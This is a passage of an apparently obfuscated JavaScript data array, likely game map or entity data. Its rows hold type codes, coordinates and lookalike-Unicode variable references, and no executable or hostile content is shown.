			[ⵠΔΔ, ⵠ[273], 1, 84, ΔΔΔΔⲆ, ᐃⵠΔ],
			[ⵠΔⲆ, ⵠ[273], ΔΔΔ, Ⲇᐃᐃᐃᐃ, ΔΔⵠⲆⵠ, ⵠⲆⲆ],
			[ΔΔΔ, ⵠ[273], 1, ⲆᐃᐃᐃΔ, 14, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[273], ΔΔΔ, 8, 22, ᐃⵠΔ],
			[1, ⵠ[273], 1, ᐃΔⲆΔᐃ, 34, 0],
			[Ⲇᐃⵠ, ⵠ[273], 1, 12, 24, ᐃΔΔ],
			[ⵠΔᐃ, ⵠ[273], 2, 8, 24, ΔΔⵠ],
			[ⵠⲆΔ, ⵠ[273], 2, 9, 21, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[273], ⵠⵠΔⲆ, 31, ⵠⵠⲆΔΔ, ᐃΔΔ],
			[ⵠΔᐃ, ⵠ[273], ΔⵠᐃⲆ, 33, 27, ΔΔⵠ],
			[ᐃⲆᐃ, ⵠ[273], ᐃⲆⵠᐃ, Ⲇᐃⵠⵠⵠ, 34, Δⵠᐃ],
			[ᐃⲆᐃ, ⵠ[273], ᐃⲆΔⲆ, ΔᐃΔⲆⲆ, ΔΔΔΔⲆ, ᐃⵠΔ],
			[Ⲇᐃⵠ, ⵠ[273], ⵠΔⲆ, ⲆΔⲆⵠᐃ, 10, 0],
			[1, ⵠ[273], ⲆᐃᐃⲆ, ⲆⵠΔᐃⵠ, 9, 0],
			[1, ⵠ[273], ⲆᐃᐃⲆ, ΔⲆⵠΔⲆⲆⵠ, Ⲇᐃᐃᐃᐃ, 0],
			[1, ⵠ[273], ΔⵠᐃⲆ, ΔⲆⵠΔⲆ, 9, 0],
			[ΔΔΔ, ⵠ[273], 2, ⲆⵠⲆⲆⲆ, ⵠⲆⲆᐃⵠ, 0],
			[ΔΔΔ, ⵠ[273], 2, 9, Δᐃᐃᐃᐃⵠⵠ, 0],
			[1, ⵠ[273], 2, ⵠⵠΔⲆᐃ, 23, 0],
			[1, ⵠ[273], ⵠⵠⵠΔ, 34, 29, ⲆΔⵠ],
			[1, ⵠ[273], ⲆⲆΔᐃ, 27, 18, 0],
			[ΔⲆⵠ, ⵠ[273], ΔⵠᐃⲆ, 25, 21, 0],
			[ΔΔΔ, ⵠ[273], ⵠⵠΔⲆ, 20, 18, 0],
			[ΔⲆⵠ, ⵠ[273], ⵠⵠⵠΔ, ⲆⵠⲆᐃΔ, 21, ⲆΔⵠ],
			[Ⲇᐃⵠ, ⵠ[273], 2, 29, 9, ⵠⲆⲆ],
			[1, ⵠ[273], 2, 13, ⲆΔⲆⵠᐃ, 0],
			[ⵠΔⲆ, ⵠ[273], ⲆᐃᐃⲆ, ⵠⲆΔⵠⵠ, 38, 0],
			[1, ⵠ[273], 2, 21, 39, Δⵠᐃ],
			[ΔΔΔ, ⵠ[273], 2, 84, 26, 0],
			[1, ⵠ[273], 2, 77, 25, 0],
			[1, ⵠ[273], ᐃⲆⵠᐃ, 86, 35, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[273], 1, 70, 35, ᐃⵠⲆ],
			[1, ⵠ[273], 2, 72, 36, Δⵠᐃ],
			[ᐃᐃⵠ, ⵠ[273], ⲆⲆΔᐃ, 73, 31, 0],
			[1, ⵠ[273], 2, 89, 39, ⲆΔⵠ],
			[ⵠΔⲆ, ⵠ[273], 2, 65, 40, ᐃΔΔ],
			[1, ⵠ[273], ᐃⲆⵠᐃ, 92, 32, ᐃΔΔ],
			[ⵠΔⲆ, ⵠ[273], ⲆᐃᐃⲆ, 90, 28, 0],
			[ⵠΔᐃ, ⵠ[348], 22, 25, 266, 0],
			[1, ⵠ[348], 22, 17, 206, ᐃⵠΔ],
			[ΔΔΔ, ⵠ[348], ⵠⲆᐃΔᐃ, 8, 184, ΔΔⵠ],
			[ⵠΔᐃ, ⵠ[348], 19, 22, 183, 0],
			[ᐃᐃⵠ, ⵠ[348], 19, 35, 188, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], ⲆⲆⵠΔⵠ, 36, 192, Δⵠᐃ],
			[ⵠΔⲆ, ⵠ[348], ᐃΔΔⲆΔ, 50, 277, 0],
			[Ⲇᐃⵠ, ⵠ[348], ᐃⲆᐃⵠⵠ, 35, 279, ᐃⵠⲆ],
			[ᐃⲆᐃ, "t", ⵠⲆⵠᐃ, 7, 178, 0],
			[1, "t", 1, ᐃⵠⵠᐃᐃ, 179, 0],
			[ᐃⲆᐃ, "t", ᐃⲆᐃᐃ, ᐃᐃᐃⵠᐃ, 180, ΔΔⵠ],
			[1, "t", 2, ᐃⵠⵠⵠΔ, 181, 0],
			[1, "t", ⲆΔΔᐃ, ᐃⲆⲆᐃᐃ, 182, 0],
			[1, "t", 4, 7, 183, ᐃⵠΔ],
			[ΔΔΔ, "t", 3, 7, 184, ΔⲆⲆ],
			[ΔⲆⵠ, "t", ᐃⵠⵠΔ, 7, 185, 0],
			[ΔⲆⵠ, "t", 2, ΔⲆΔᐃᐃ, 186, 0],
			[1, "t", 1, ᐃⵠⵠᐃᐃ, 187, 0],
			[1, "t", 4, 7, 188, 0],
			[ⵠΔⲆ, "t", 3, ⵠΔᐃⵠⵠ, 189, ⵠⲆⲆ],
			[Ⲇᐃⵠ, "t", 5, ⲆᐃᐃᐃΔ, 190, 0],
			[1, "t", 1, ⲆᐃᐃᐃΔ, 191, 0],
			[1, "t", ⵠⵠⵠᐃ, ᐃᐃᐃⵠᐃ, 192, ᐃⵠⲆ],
			[1, "t", 4, ᐃᐃᐃⵠᐃ, 193, Δⵠᐃ],
			[1, "t", 3, 7, 194, 0],
			[1, "t", ⲆΔΔᐃ, 7, 195, ᐃⵠΔ],
			[1, "t", 2, ᐃⲆⲆᐃᐃ, 196, ΔΔⵠ],
			[1, "t", ⲆⲆⲆΔ, 7, 197, ᐃⵠΔ],
			[ΔΔΔ, "b", ᐃⲆⵠᐃ, 7, 198, 0],
			[1, "t", ⵠΔᐃΔ, 7, 199, 0],
			[ⵠΔΔ, "t", ⵠⵠΔⲆ, 7, 200, 0],
			[1, "t", ⵠᐃΔⵠ, ᐃᐃᐃⵠᐃ, 201, 0],
			[1, "t", 2, ⵠⵠⲆⲆⵠ, 202, 0],
			[1, "t", ⵠΔᐃΔ, ΔⲆΔᐃᐃ, 203, ᐃⵠⲆ],
			[1, "t", ⵠⵠΔⲆ, 7, 204, ᐃΔΔ],
			[ᐃᐃⵠ, "t", 5, ⵠⵠⲆⲆⵠ, 205, 0],
			[ᐃᐃⵠ, "t", 2, ᐃⵠⵠⵠΔ, 206, ᐃΔΔ],
			[1, "t", ᐃᐃⵠ, 7, 207, ᐃⵠΔ],
			[Ⲇᐃⵠ, "t", Ⲇⵠⵠⵠ, ΔⲆΔᐃᐃ, 208, ΔⲆⲆ],
			[ⵠΔΔ, "t", 3, ⵠΔᐃⵠⵠ, 209, 0],
			[1, "t", ⵠΔΔ, ΔⲆΔᐃᐃ, 210, 0],
			[1, "b", ⲆΔⵠ, 7, 211, 0],
			[ΔⲆⵠ, "t", ᐃⲆᐃᐃ, 7, 212, 0],
			[ΔΔΔ, "t", 4, 7, 213, ΔΔⵠ],
			[1, "t", ᐃⲆΔⵠ, ΔⲆΔᐃᐃ, 214, 0],
			[ᐃᐃⵠ, "t", ⵠᐃΔⵠ, ᐃΔⲆΔᐃ, 215, Δⵠᐃ],
			[Ⲇᐃⵠ, "t", ⲆΔΔᐃ, ᐃΔⲆΔᐃ, 216, 0],
			[1, "t", 3, 7, 217, Δⵠᐃ],
			[1, "t", ᐃᐃⵠ, ⲆᐃᐃᐃΔ, 218, 0],
			[1, "t", Ⲇᐃⵠᐃ, ᐃᐃᐃⵠᐃ, 219, ΔⲆⲆ],
			[1, "b", ⲆⲆΔᐃ, ΔⲆΔᐃᐃ, 220, ΔΔⵠ],
			[ⵠⲆΔ, "t", 1, 7, 221, 0],
			[1, "t", ⲆᐃᐃⲆ, 7, 222, ΔⲆⲆ],
			[1, "t", ⵠⲆⵠᐃ, ᐃΔⲆΔᐃ, 223, 0],
			[1, "t", ΔⲆΔᐃ, ᐃⲆⲆᐃᐃ, 224, 0],
			[ΔⲆⵠ, "t", ⵠⲆΔ, 7, 225, 0],
			[ⵠⲆΔ, "t", 4, 7, 226, 0],
			[1, "t", ΔⵠᐃⲆ, ⵠΔᐃⵠⵠ, 227, 0],
			[1, "t", ⵠᐃΔⵠ, 7, 228, Δⵠᐃ],
			[1, "t", ᐃⲆᐃᐃ, 7, 229, 0],
			[1, "t", 1, 7, 230, 0],
			[1, "t", ⲆΔⵠᐃ, 7, 231, 0],
			[1, "b", 2, 7, 232, ᐃⵠΔ],
			[1, "t", 5, ⲆᐃᐃᐃΔ, 233, ⲆΔⵠ],
			[ᐃᐃⵠ, "t", 1, ᐃⵠⵠᐃᐃ, 234, ΔΔⵠ],
			[ΔΔΔ, "t", ᐃⲆΔⵠ, ᐃᐃᐃⵠᐃ, 235, 0],
			[1, "t", 4, ᐃᐃᐃⵠᐃ, 236, 0],
			[1, "t", 2, 7, 237, Δⵠᐃ],
			[ᐃᐃⵠ, "t", ᐃΔΔΔ, ᐃⵠⵠⵠΔ, 238, ᐃⵠⲆ],
			[1, "b", 3, 7, 239, 0],
			[Ⲇᐃⵠ, "t", 2, 7, 240, ⲆΔⵠ],
			[ᐃⲆᐃ, "t", 1, 7, 241, ⲆΔⵠ],
			[1, "t", 2, 7, 242, 0],
			[1, "t", 4, 7, 243, ᐃΔΔ],
			[ⵠΔᐃ, "t", 3, ⵠⵠⲆⲆⵠ, 244, 0],
			[ⵠΔⲆ, "t", Ⲇᐃⵠᐃ, 7, 245, 0],
			[ΔΔΔ, "t", Ⲇᐃⵠ, 7, 246, ᐃΔΔ],
			[ⵠΔⲆ, "b", ᐃΔΔ, 7, 247, ᐃⵠⲆ],
			[1, "t", 3, 7, 248, 0],
			[1, "t", 5, ᐃⵠⵠⵠΔ, 249, ⲆΔⵠ],
			[1, "t", 2, 7, 250, ΔⲆⲆ],
			[1, "t", ⵠΔᐃ, 7, 251, ΔΔⵠ],
			[ᐃⲆᐃ, "t", 4, 7, 252, ΔⲆⲆ],
			[1, "t", 3, ᐃⵠⵠᐃᐃ, 253, 0],
			[1, "t", 5, ⵠⵠⲆⲆⵠ, 254, Δⵠᐃ],
			[1, "t", 1, 7, 255, 0],
			[ⵠⲆΔ, "t", 4, ⲆᐃᐃᐃΔ, ΔΔᐃⲆⲆⵠⵠ, ᐃⵠΔ],
			[1, "t", 1, 7, 257, ⲆΔⵠ],
			[ⵠΔΔ, "t", 2, 7, 258, 0],
			[Ⲇᐃⵠ, "t", 5, 7, 260, ⲆΔⵠ],
			[ⵠΔᐃ, "t", 3, ΔⲆΔᐃᐃ, 259, 0],
			[ⵠΔᐃ, "t", 1, 7, 261, ⲆΔⵠ],
			[ⵠΔᐃ, "t", 3, ᐃⲆⲆᐃᐃ, 262, 0],
			[1, "t", ᐃⵠⵠΔ, 7, 263, 0],
			[1, "t", 1, ᐃΔⲆΔᐃ, 264, ΔⲆⲆ],
			[1, "t", ΔⵠᐃⲆ, 7, 265, 0],
			[ⵠⲆΔ, "t", 5, ᐃᐃᐃⵠᐃ, 266, ᐃΔΔ],
			[ⵠΔΔ, "t", 2, ⲆᐃᐃᐃΔ, 267, 0],
			[1, "t", ⵠⵠΔⲆ, ᐃⲆⲆᐃᐃ, 269, 0],
			[ᐃⲆᐃ, "b", ᐃⲆΔⲆ, 7, 268, ᐃⵠⲆ],
			[1, "t", 4, ᐃΔⲆΔᐃ, 270, 0],
			[1, "t", ΔⲆⵠ, 7, 271, ⵠⲆⲆ],
			[ⵠΔΔ, "t", ΔⵠⲆⲆ, ᐃΔⲆΔᐃ, 272, ᐃⵠⲆ],
			[1, "b", 2, ᐃⲆⲆᐃᐃ, 273, ᐃⵠⲆ],
			[1, "t", 4, ᐃᐃᐃⵠᐃ, 274, 0],
			[Ⲇᐃⵠ, "t", ᐃⲆΔⲆ, 7, 275, 0],
			[1, "t", ΔΔᐃⲆ, 7, 276, ΔⲆⲆ],
			[1, "t", 5, ᐃⲆⲆᐃᐃ, 277, ⵠⲆⲆ],
			[1, "t", ⵠⵠΔⲆ, 7, 278, ᐃⵠⲆ],
			[1, "t", 1, ⵠΔᐃⵠⵠ, 279, ᐃⵠΔ],
			[ⵠΔΔ, "t", 4, ⵠⵠⲆⲆⵠ, 280, ᐃⵠΔ],
			[1, "b", 1, ⵠⵠⲆⲆⵠ, 281, ᐃΔΔ],
			[1, "t", ΔⲆᐃⲆ, ᐃⵠⵠᐃᐃ, 282, 0],
			[1, "t", ⲆᐃᐃΔ, ΔⲆΔᐃᐃ, 283, ΔⲆⲆ],
			[1, "t", 1, 7, 284, ᐃⵠⲆ],
			[ⵠΔΔ, "t", 3, 7, 285, 0],
			[1, "t", ⲆΔΔᐃ, 7, 286, 0],
			[1, "t", 4, ᐃⵠⵠᐃᐃ, 288, ΔΔⵠ],
			[1, "t", ⲆⲆΔᐃ, 7, 287, ᐃⵠΔ],
			[ΔⲆⵠ, "b", ⵠⲆⲆ, 7, 289, 0],
			[ⵠΔΔ, "t", 4, ΔⲆΔᐃᐃ, 290, 0],
			[1, "t", ⲆᐃᐃⲆ, 7, 291, 0],
			[ᐃᐃⵠ, "t", 5, ᐃⵠⵠⵠΔ, 292, ⲆΔⵠ],
			[1, "t", ᐃᐃⲆⲆ, ⲆᐃᐃᐃΔ, 293, ⲆΔⵠ],
			[Ⲇᐃⵠ, "t", ᐃⲆᐃ, ᐃΔⲆΔᐃ, 294, 0],
			[1, "t", 4, ⵠΔᐃⵠⵠ, 295, ⲆΔⵠ],
			[ᐃᐃⵠ, "t", ᐃᐃⲆⲆ, ᐃⵠⵠⵠΔ, 296, ᐃⵠⲆ],
			[ⵠⲆΔ, "t", ⵠΔᐃ, ΔⲆΔᐃᐃ, 297, ⵠⲆⲆ],
			[1, "t", ⵠⲆⵠᐃ, ᐃⵠⵠᐃᐃ, 298, 0],
			[1, "t", ⲆᐃᐃⲆ, ᐃⵠⵠⵠΔ, 299, 0],
			[1, "b", Δⵠᐃ, 7, 300, ΔⲆⲆ],
			[ⵠΔᐃ, "t", 2, ᐃⵠⵠᐃᐃ, 301, 0],
			[ⵠΔᐃ, "r", 196, 271, ΔΔⵠ],
			[ⵠⲆΔ, "r", 199, 274, 0],
			[ⵠΔⲆ, "r", 167, 238, 0],
			[Ⲇᐃⵠ, "r", 171, 240, 0],
			[ᐃᐃⵠ, "r", 189, 207, ᐃΔΔ],
			[Ⲇᐃⵠ, "r", 192, 209, 0],
			[Ⲇᐃⵠ, "r", 198, 271, Δⵠᐃ],
			[1, "r", 197, 271, 0],
			[ΔΔΔ, "r", 198, 272, ᐃⵠⲆ],
			[ΔΔΔ, "r", 197, 272, ᐃⵠⲆ],
			[ⵠΔⲆ, "r", 196, 272, ΔΔⵠ],
			[ᐃᐃⵠ, "r", 195, 272, ΔΔⵠ],
			[1, "r", 199, 272, ΔⲆⲆ],
			[ᐃⲆᐃ, "r", 199, 273, ΔⲆⲆ],
			[1, "r", 198, 273, ᐃⵠⲆ],
			[ΔΔΔ, "r", 197, 273, ΔⲆⲆ],
			[1, "r", 196, 273, Δⵠᐃ],
			[ΔⲆⵠ, "r", 198, 274, Δⵠᐃ],
			[ⵠⲆΔ, "r", 197, 274, ΔⲆⲆ],
			[ⵠΔⲆ, "r", 195, 273, 0],
			[ⵠⲆΔ, "r", 196, 274, ⲆΔⵠ],
			[1, "r", 198, 275, 0],
			[ΔΔΔ, "r", 197, 275, ᐃⵠⲆ],
			[1, "r", 200, 274, ΔⲆⲆ],
			[Ⲇᐃⵠ, "r", 200, 273, ΔΔⵠ],
			[ⵠΔᐃ, "r", 199, 275, 0],
			[1, ⵠ[138], ⲆᐃᐃⲆ, 200, 272, 0],
			[ΔΔΔ, ⵠ[138], 1, 195, 271, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[138], ΔⲆⲆ, 199, 268, ΔΔⵠ],
			[1, ⵠ[138], 0, 193, 277, 0],
			[ⵠΔⲆ, ⵠ[138], ᐃⲆᐃ, 199, 276, 0],
			[1, "s", ᐃⲆᐃ, 200, 275, ᐃⲆᐃ],
			[ᐃⲆᐃ, "s", 1, 194, 272, 1],
			[ᐃⲆᐃ, "s", 2, 193, 270, ΔⲆⵠ],
			[ⵠⲆΔ, "g", ᐃⲆΔⲆ, 193, 273, 1],
			[1, "g", ⵠⵠⵠΔ, 201, 267, 1],
			[1, "m", ᐃⲆⵠᐃ, 220, 298, 1],
			[ΔΔΔ, "m", 1, 219, 292, ᐃᐃⵠ],
			[1, "m", 1, 214, 297, 1],
			[1, "r", 168, 238, 0],
			[1, "r", 169, 238, 0],
			[1, "r", 170, 238, ΔⲆⲆ],
			[ΔⲆⵠ, "r", 171, 239, 0],
			[1, "r", 170, 239, 0],
			[1, "r", 169, 239, 0],
			[ⵠΔᐃ, "r", 168, 239, ᐃⵠⲆ],
			[1, "r", 167, 239, 0],
			[ᐃⲆᐃ, "r", 166, 239, ᐃΔΔ],
			[1, "r", 166, 240, ΔⲆⲆ],
			[1, "r", 167, 240, 0],
			[ᐃᐃⵠ, "r", 168, 240, 0],
			[Ⲇᐃⵠ, "r", 169, 240, ᐃⵠⲆ],
			[1, "r", 170, 240, ⵠⲆⲆ],
			[1, "r", 168, 241, 0],
			[1, "r", 169, 241, Δⵠᐃ],
			[1, "r", 170, 241, 0],
			[ᐃⲆᐃ, "r", 171, 241, Δⵠᐃ],
			[1, ⵠ[138], ⵠⵠⵠΔ, 171, 238, 0],
			[ΔⲆⵠ, ⵠ[138], 1, 166, 238, ΔⲆⲆ],
			[1, ⵠ[138], Δⵠᐃ, 167, 237, 0],
			[ⵠΔⲆ, ⵠ[138], 0, 171, 242, 0],
			[ⵠΔΔ, ⵠ[138], 0, 165, 243, ᐃΔΔ],
			[1, ⵠ[138], ᐃΔΔ, 171, 235, Δⵠᐃ],
			[ᐃⲆᐃ, ⵠ[138], 0, 174, 241, ΔⲆⲆ],
			[1, "s", 1, 165, 239, 1],
			[ⵠΔᐃ, "s", ᐃⲆᐃ, 172, 241, ΔⲆⵠ],
			[ⵠΔⲆ, "s", 0, 170, 237, ⵠⲆΔ],
			[ᐃᐃⵠ, "s", 1, 171, 237, 1],
			[1, "s", 2, 174, 236, 1],
			[ΔΔΔ, "s", 2, 162, 241, ᐃᐃⵠ],
			[ⵠΔΔ, "s", 2, 170, 246, 1],
			[ⵠΔⲆ, "s", ΔⵠᐃⲆ, 167, 235, ⵠΔⲆ],
			[ΔΔΔ, "s", ⲆᐃᐃⲆ, 176, 243, 1],
			[1, "r", 190, 207, 0],
			[ΔⲆⵠ, "r", 191, 207, Δⵠᐃ],
			[ᐃᐃⵠ, "r", 192, 208, ΔΔⵠ],
			[1, "r", 191, 208, ΔΔⵠ],
			[ⵠΔᐃ, "r", 190, 208, 0],
			[1, "r", 189, 208, 0],
			[ᐃᐃⵠ, "r", 188, 208, ⲆΔⵠ],
			[1, "r", 189, 209, 0],
			[1, "r", 190, 209, ᐃⵠⲆ],
			[1, "r", 191, 209, 0],
			[1, "r", 188, 209, ᐃⵠΔ],
			[1, "r", 190, 210, 0],
			[ⵠΔΔ, "r", 191, 210, 0],
			[1, "r", 192, 210, Δⵠᐃ],
			[1, ⵠ[138], 2, 189, 210, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[138], 2, 192, 205, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[138], 1, 192, 207, ᐃⵠΔ],
			[ΔⲆⵠ, ⵠ[138], 0, 193, 210, 0],
			[ᐃⲆᐃ, ⵠ[138], ᐃΔΔ, 187, 208, 0],
			[ᐃⲆᐃ, ⵠ[138], 0, 197, 206, 0],
			[ⵠΔⲆ, ⵠ[138], 0, 191, 213, 0],
			[Ⲇᐃⵠ, ⵠ[138], 0, 190, 204, 0],
			[1, "s", 1, 188, 207, Ⲇᐃⵠ],
			[1, "s", 1, 190, 211, 1],
			[ⵠΔⲆ, "s", 2, 188, 213, 1],
			[ⵠΔᐃ, "s", ⲆᐃᐃⲆ, 187, 205, ᐃᐃⵠ],
			[ᐃᐃⵠ, "s", 0, 194, 210, 1],
			[1, "s", Δⵠᐃ, 198, 207, 1],
			[1, "s", 1, 193, 204, 1],
			[ⵠⲆΔ, "s", ⵠΔⲆ, 193, 213, ᐃᐃⵠ],
			[1, "s", 2, 198, 212, ᐃᐃⵠ],
			[1, "s", ᐃⲆⵠᐃ, 182, 208, ⵠΔᐃ],
			[ⵠΔᐃ, "s", 1, 204, 271, ΔⲆⵠ],
			[1, "s", 0, 203, 272, 1],
			[ᐃⲆᐃ, "s", 0, 189, 275, ΔΔΔ],
			[ᐃⲆᐃ, "s", 0, 195, 265, ΔΔΔ],
			[ᐃⲆᐃ, "s", ⵠⵠΔⲆ, 196, 264, ⵠΔΔ],
			[1, "s", 2, 186, 274, ᐃⲆᐃ],
			[1, "s", ⲆᐃᐃⲆ, 197, 280, ΔⲆⵠ],
			[ⵠΔⲆ, "s", ΔΔⵠ, 217, 282, 1],
			[1, "s", ᐃᐃⵠ, 214, 285, 1],
			[1, "s", ᐃⲆᐃ, 214, 274, 1],
			[1, "s", 1, 203, 282, 1],
			[ΔΔΔ, "s", ⵠΔⲆ, 205, 290, 1],
			[ⵠΔⲆ, "s", 0, 207, 292, 1],
			[1, "s", 0, 197, 297, ᐃⲆᐃ],
			[1, "s", 0, 184, 287, 1],
			[1, "s", 2, 213, 289, ΔΔΔ],
			[1, "s", ΔⵠᐃⲆ, 196, 294, ⵠΔⲆ],
			[ⵠΔΔ, "s", 2, 187, 286, ⵠΔⲆ],
			[1, "s", 1, 192, 289, 1],
			[1, "s", ᐃᐃⵠ, 189, 299, ⵠⲆΔ],
			[1, "s", 0, 213, 273, 1],
			[ᐃⲆᐃ, "g", ⲆᐃᐃⲆ, 212, 278, 1],
			[ⵠΔᐃ, "g", ⵠΔᐃ, 200, 288, ⵠΔᐃ],
			[ⵠΔⲆ, "g", ⲆᐃᐃⲆ, 215, 265, 1],
			[1, "g", 2, 183, 281, ᐃⲆᐃ],
			[Ⲇᐃⵠ, "s", 0, 178, 295, Ⲇᐃⵠ],
			[1, "s", 0, 167, 281, 1],
			[ⵠΔⲆ, "s", ΔΔⵠ, 175, 263, Ⲇᐃⵠ],
			[1, "s", ᐃᐃⵠ, 176, 293, 1],
			[1, "s", 1, 163, 285, ΔΔΔ],
			[1, "s", ΔΔΔ, 177, 266, 1],
			[ⵠⲆΔ, "s", ⵠⲆΔ, 161, 272, ΔⲆⵠ],
			[ⵠΔΔ, "s", 2, 185, 261, 1],
			[1, "c", ⲆΔⵠ, 217, 270, ΔΔΔ],
			[ⵠΔᐃ, "c", 0, 220, 278, 1],
			[1, "c", ΔⲆⲆ, 217, 283, 1],
			[1, "c", 0, 220, 287, 1],
			[ΔΔΔ, "c", 0, 210, 292, 1],
			[1, "c", 0, 205, 297, 1],
			[1, "c", ΔΔⵠ, 198, 293, ᐃⲆᐃ],
			[1, "c", 0, 208, 283, 1],
			[ⵠⲆΔ, "c", 0, 197, 283, 1],
			[ΔⲆⵠ, "c", ΔⲆⲆ, 190, 289, ᐃᐃⵠ],
			[Ⲇᐃⵠ, "c", 0, 183, 296, ⵠΔⲆ],
			[1, "c", Δⵠᐃ, 189, 291, 1],
			[ᐃᐃⵠ, "c", ⲆΔⵠ, 178, 284, 1],
			[ⵠΔᐃ, "c", 0, 208, 265, ᐃᐃⵠ],
			[1, "c", 0, 169, 292, Ⲇᐃⵠ],
			[ⵠⲆΔ, "s", 1, 158, 294, ᐃⲆᐃ],
			[1, "s", 0, 151, 297, 1],
			[ΔⲆⵠ, "s", ⲆΔⵠ, 147, 288, ᐃⲆᐃ],
			[ⵠⲆΔ, "c", 0, 150, 289, 1],
			[1, "c", ᐃⵠΔ, 160, 282, 1],
			[ⵠΔⲆ, "c", ⵠⲆⲆ, 146, 274, 1],
			[1, "c", ᐃΔΔ, 167, 264, 1],
			[ΔⲆⵠ, "c", 0, 165, 267, ΔΔΔ],
			[1, "g", ᐃΔΔ, 189, 257, ⵠΔΔ],
			[1, "g", ΔΔΔ, 197, 248, 1],
			[1, "g", 2, 170, ΔⵠⲆⵠᐃ, 1],
			[ΔⲆⵠ, "g", 2, 212, 234, 1],
			[1, "g", ᐃⲆΔⲆ, 189, 230, 1],
			[ΔΔΔ, "g", ᐃⲆΔⲆ, 173, 221, 1],
			[1, "g", 1, 210, 214, ΔⲆⵠ],
			[ⵠΔΔ, "s", 1, 153, 257, 1],
			[1, "s", ᐃΔΔ, 158, ΔⵠᐃⵠΔ, ⵠΔᐃ],
			[Ⲇᐃⵠ, "s", 0, 184, 248, Ⲇᐃⵠ],
			[ᐃⲆᐃ, "s", 0, 212, 254, 1],
			[1, "s", 1, 203, 249, ⵠⲆΔ],
			[1, "s", 2, 204, 252, ⵠΔⲆ],
			[1, "s", 2, 187, 248, ⵠΔⲆ],
			[ⵠΔᐃ, "s", ᐃⵠⲆ, 206, 237, ᐃᐃⵠ],
			[ᐃⲆᐃ, "s", 0, 196, 227, ᐃⲆᐃ],
			[1, "s", ΔΔⵠ, 181, 228, ᐃᐃⵠ],
			[1, "s", ⵠⲆΔ, 199, 227, ⵠΔᐃ],
			[ᐃⲆᐃ, "s", 1, 208, 238, 1],
			[1, "s", 1, 179, 222, 1],
			[1, "s", 1, 213, 223, ΔⲆⵠ],
			[1, "s", ΔⵠᐃⲆ, 182, 222, 1],
			[ⵠΔⲆ, "s", ⵠⵠⵠΔ, 211, 226, 1],
			[ΔΔΔ, "s", ᐃⲆⵠᐃ, 214, 214, ⵠΔᐃ],
			[ⵠΔΔ, "s", ⲆᐃᐃⲆ, 201, 216, 1],
			[ΔⲆⵠ, "s", ΔⵠᐃⲆ, 215, 192, 1],
			[1, "s", ΔΔΔ, 210, 198, 1],
			[ⵠΔⲆ, "s", ⵠΔᐃ, 198, 196, 1],
			[ΔΔΔ, "s", ᐃⲆⵠᐃ, 208, 199, 1],
			[1, "s", 2, 187, 192, ΔⲆⵠ],
			[ⵠⲆΔ, "s", ΔΔΔ, 179, 198, ᐃⲆᐃ],
			[1, "s", 2, 177, 197, 1],
			[1, "s", 0, 164, 197, ΔⲆⵠ],
			[1, "s", ⵠΔⲆ, 159, 193, 1],
			[ᐃᐃⵠ, "s", 1, 149, 206, ⵠΔᐃ],
			[1, "s", Ⲇᐃⵠ, 164, 209, 1],
			[1, "s", ⵠⵠΔⲆ, 165, 210, 1],
			[1, "s", ⵠⵠΔⲆ, 161, 191, 1],
			[ᐃⲆᐃ, "s", ⵠΔⲆ, 162, 224, 1],
			[1, "s", ᐃΔΔ, 150, 236, 1],
			[1, "s", ⵠΔΔ, 149, 239, ΔⲆⵠ],
			[ⵠⲆΔ, "s", 2, 153, 236, 1],
			[1, "s", ⲆᐃᐃⲆ, 160, 223, ⵠΔᐃ],
			[ᐃᐃⵠ, "s", 2, 151, 207, Ⲇᐃⵠ],
			[1, "s", 2, 147, 220, ⵠΔᐃ],
			[ΔΔΔ, "s", ⵠⵠⵠΔ, 145, 265, 1],
			[ᐃⲆᐃ, "s", 2, 145, 285, 1],
			[1, "c", ⲆΔⵠ, 152, 266, ⵠⲆΔ],
			[ΔⲆⵠ, "c", 0, 185, 271, 1],
			[1, "c", 0, 210, 254, ⵠⲆΔ],
			[ᐃⲆᐃ, "c", ᐃⵠΔ, 209, ⵠΔⵠⲆᐃᐃⵠ, 1],
			[ᐃⲆᐃ, "c", ΔΔⵠ, 198, 254, 1],
			[ⵠⲆΔ, "c", 0, 213, 246, 1],
			[1, "c", Δⵠᐃ, 216, 237, ⵠⲆΔ],
			[ⵠⲆΔ, "c", 0, 204, 240, 1],
			[ᐃᐃⵠ, "c", 0, 196, 234, ⵠΔᐃ],
			[ΔⲆⵠ, "c", 0, 188, 238, ΔⲆⵠ],
			[1, "c", ᐃΔΔ, 182, 245, ΔⲆⵠ],
			[ᐃⲆᐃ, "c", 0, 173, 252, Ⲇᐃⵠ],
			[1, "c", Δⵠᐃ, 153, 248, 1],
			[1, "c", 0, 158, 233, 1],
			[1, "c", 0, 147, 230, 1],
			[1, "c", ΔⲆⲆ, 151, 224, 1],
			[1, "c", ⵠⲆⲆ, 157, 214, 1],
			[1, "c", Δⵠᐃ, 167, 219, ᐃᐃⵠ],
			[ⵠⲆΔ, "c", ⵠⲆⲆ, 171, 208, ⵠΔᐃ],
			[1, "c", 0, 179, 219, 1],
			[ΔⲆⵠ, "c", ΔⲆⲆ, 176, 229, Ⲇᐃⵠ],
			[1, "c", 0, 195, 221, 1],
			[1, "c", 0, 207, 222, ΔⲆⵠ],
			[1, "c", ᐃΔΔ, 214, 207, 1],
			[1, "c", ⵠⲆⲆ, 205, 210, 1],
			[ᐃⲆᐃ, "c", 0, 204, 196, 1],
			[ᐃᐃⵠ, "c", ᐃΔΔ, 214, 196, 1],
			[ⵠΔᐃ, "c", ᐃΔΔ, 190, 199, ᐃᐃⵠ],
			[ⵠΔΔ, "c", Δⵠᐃ, 184, 194, 1],
			[ΔΔΔ, "c", ΔⲆⲆ, 172, 199, 1],
			[1, "c", 0, 161, 204, ΔΔΔ],
			[1, "c", ΔⲆⲆ, 157, 196, 1],
			[ⵠΔΔ, "c", 0, 149, 194, ⵠΔⲆ],
			[Ⲇᐃⵠ, "c", ΔⲆⲆ, 147, 208, ⵠⲆΔ],
			[1, "c", 0, 207, 274, 1],
			[1, "c", ⵠⲆⲆ, 217, 258, ᐃⲆᐃ],
			[ⵠΔⲆ, "c", Δⵠᐃ, 201, 260, 1],
